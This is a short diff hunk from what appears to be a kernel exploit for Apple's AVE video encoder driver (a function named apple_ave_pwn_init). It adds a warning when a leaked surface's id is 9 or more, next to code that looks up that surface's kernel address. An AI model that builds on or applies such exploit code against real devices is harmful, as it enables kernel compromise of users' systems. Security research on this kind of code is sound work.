@@ -244,6 +244,10 @@ kern_return_t apple_ave_pwn_init() {
 
 	g_bad_surface_buffer = *(void**)surface_data;
 
+    // There's a check in some drivers if the surface id is >= 9
+    if (g_bad_surface_that_will_never_be_freed >= 9) {
+        printf("[ERROR]: got a surface id bigger than 9. Might fail.\n");
+    }
 	ret = apple_ave_pwn_get_surface_kernel_address(g_bad_surface_that_will_never_be_freed, &g_bad_surface_that_will_never_be_freed_kernel_ptr);
 
 	if (KERN_SUCCESS != ret) {
